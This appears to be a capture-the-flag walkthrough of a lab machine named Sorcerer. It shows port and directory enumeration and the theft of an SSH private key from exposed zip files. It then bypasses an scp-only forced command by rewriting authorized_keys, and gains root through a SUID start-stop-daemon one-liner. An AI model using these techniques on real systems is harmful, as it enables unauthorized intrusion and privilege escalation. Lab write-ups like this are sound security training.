##### Tags: `SUID`  `scp`  `start-stop-daemon`  `GTFOBin`

# 🐧Sorcerer🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.118.100

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http     nginx
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      3-4 (RPC #100003)
7742/tcp  open  http     nginx
8080/tcp  open  http     Apache Tomcat 7.0.4
33065/tcp open  nlockmgr 1-4 (RPC #100021)
35835/tcp open  mountd   1-3 (RPC #100005)
42329/tcp open  mountd   1-3 (RPC #100005)
43307/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
always go for http service first  
port 80 is an error page  
port 8080 is tomcat page, nothing interested
port 7742 is a login page  
gobuster found a /zipfiles page
```console
$ gobuster dir -u http://192.168.118.100:7742 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.118.100:7742
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/default              (Status: 301) [Size: 178] [--> http://192.168.118.100:7742/default/]
/index.html           (Status: 200) [Size: 1219]
/index.html           (Status: 200) [Size: 1219]
/zipfiles             (Status: 301) [Size: 178] [--> http://192.168.118.100:7742/zipfiles/]
```
it has 4 users zip files
```console
francis.zip                                        24-Sep-2020 19:27                2834
max.zip                                            24-Sep-2020 19:27                8274
miriam.zip                                         24-Sep-2020 19:27                2826
sofia.zip                                          24-Sep-2020 19:27                2818
```
we found the id_rsa private key
```console
$ ls -la
total 20
drwxr-xr-x 2 ming ming 4096 Mar  8 16:49 .
drwxr-xr-x 3 ming ming 4096 Mar  8 16:32 ..
-rw-r--r-- 1 ming ming  738 Mar  8 16:49 authorized_keys
-rw------- 1 ming ming 3381 Sep 25  2020 id_rsa
-rw-r--r-- 1 ming ming  738 Sep 25  2020 id_rsa.pub
```
and we have the public key but it is running scp_wrapper.sh and blocking us getting the shell 
```console
$ cat authorized_keys
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```
scp_wrapper.sh is allowing us to use scp to upload or download files
```console
$ cat scp_wrapper.sh      
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```
so we just need to remove the restriction in the public key file
```console
$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```
upload it back to the target using scp
```console
$ scp -O -i id_rsa ./authorized_keys max@192.168.118.100:/home/max/.ssh/authorized_keys 
authorized_keys                                                                 100%  738     7.0KB/s   00:00
```
we can login as max via ssh
```console
$ ssh -i id_rsa max@192.168.118.100
max@sorcerer:~$ id
uid=1003(max) gid=1003(max) groups=1003(max)
```
## Privilege Escalation
linpeas shows we have start-stop-daemon has suid bit
```console
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                
                      ╚════════════════════════════════════╝                                                      
╔══════════╣ SUID - Check easy privesc, exploits and write perms
                                                    
-rwsr-xr-x 1 root root 44K Jun  3  2019 /usr/sbin/start-stop-daemon
```
there is a command to get root in GTFObin  
https://gtfobins.org/gtfobins/start-stop-daemon/#shell
```console
max@sorcerer:/$ /usr/sbin/start-stop-daemon -S -x /bin/sh -n rootttt -- -p

root@sorcerer:/# id
uid=0(root) gid=1003(max) groups=1003(max)
```
